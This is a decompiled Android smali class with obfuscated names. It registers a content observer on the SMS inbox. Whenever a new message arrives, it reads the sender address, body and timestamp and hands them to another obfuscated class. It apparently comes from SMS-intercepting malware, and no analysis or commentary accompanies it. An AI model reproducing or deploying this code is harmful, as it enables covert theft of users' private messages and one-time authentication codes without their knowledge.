.class public final Lcom/boJUF/mB/mB/pO/JO/tP/Ut;
.super Landroid/database/ContentObserver;


# instance fields
.field private LA:Landroid/content/Context;

.field private On:Lcom/boJUF/mB/mB/pO/JO/tP/uI;

.field private cp:I


# direct methods
.method public constructor <init>(Landroid/os/Handler;Landroid/content/Context;)V
    .locals 7

    const/4 v0, 0x0

    invoke-direct {p0, v0}, Landroid/database/ContentObserver;-><init>(Landroid/os/Handler;)V

    iput-object p2, p0, Lcom/boJUF/mB/mB/pO/JO/tP/Ut;->LA:Landroid/content/Context;

    new-instance v0, Lcom/boJUF/mB/mB/pO/JO/tP/uI;

    invoke-direct {v0, p2}, Lcom/boJUF/mB/mB/pO/JO/tP/uI;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/Ut;->On:Lcom/boJUF/mB/mB/pO/JO/tP/uI;

    :try_start_0
    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/Ut;->LA:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "content://sms"

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    const/4 v2, 0x0

    const-string v3, "type=?"

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/String;

    const/4 v5, 0x0

    const-string v6, "1"

    aput-object v6, v4, v5

    const-string v5, "date desc"

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0

    invoke-interface {v0}, Landroid/database/Cursor;->getCount()I

    move-result v1

    iput v1, p0, Lcom/boJUF/mB/mB/pO/JO/tP/Ut;->cp:I

    invoke-interface {v0}, Landroid/database/Cursor;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method


# virtual methods
.method public final onChange(Z)V
    .locals 9

    :try_start_0
    new-instance v6, Lcom/boJUF/mB/mB/pO/mB/XQ;

    invoke-direct {v6}, Lcom/boJUF/mB/mB/pO/mB/XQ;-><init>()V

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/Ut;->LA:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "content://sms"

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    const/4 v2, 0x0

    const-string v3, "type=?"

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/String;

    const/4 v5, 0x0

    const-string v7, "1"

    aput-object v7, v4, v5

    const-string v5, "date desc"

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0

    invoke-interface {v0}, Landroid/database/Cursor;->getCount()I

    move-result v7

    invoke-interface {v0}, Landroid/database/Cursor;->close()V

    iget v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/Ut;->cp:I

    if-le v7, v0, :cond_0

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/Ut;->LA:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "content://sms"

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    const/4 v2, 0x0

    const-string v3, "type=?"

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/String;

    const/4 v5, 0x0

    const-string v8, "1"

    aput-object v8, v4, v5

    const-string v5, "date desc limit 1"

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0

    invoke-interface {v0}, Landroid/database/Cursor;->getCount()I

    move-result v1

    if-lez v1, :cond_2

    :goto_0
    invoke-interface {v0}, Landroid/database/Cursor;->moveToNext()Z

    move-result v1

    if-eqz v1, :cond_1

    const-string v1, "address"

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    iput-object v1, v6, Lcom/boJUF/mB/mB/pO/mB/XQ;->LA:Ljava/lang/String;

    const-string v1, "body"

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    iput-object v1, v6, Lcom/boJUF/mB/mB/pO/mB/XQ;->cp:Ljava/lang/String;

    const-string v1, "date"

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v1

    iput-wide v1, v6, Lcom/boJUF/mB/mB/pO/mB/XQ;->On:J
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    :cond_0
    :goto_1
    return-void

    :cond_1
    :try_start_1
    invoke-interface {v0}, Landroid/database/Cursor;->close()V

    invoke-super {p0, p1}, Landroid/database/ContentObserver;->onChange(Z)V

    :cond_2
    iput v7, p0, Lcom/boJUF/mB/mB/pO/JO/tP/Ut;->cp:I

    iget-object v0, p0, Lcom/boJUF/mB/mB/pO/JO/tP/Ut;->On:Lcom/boJUF/mB/mB/pO/JO/tP/uI;

    invoke-virtual {v0, v6}, Lcom/boJUF/mB/mB/pO/JO/tP/uI;->On(Lcom/boJUF/mB/mB/pO/mB/XQ;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_1
.end method
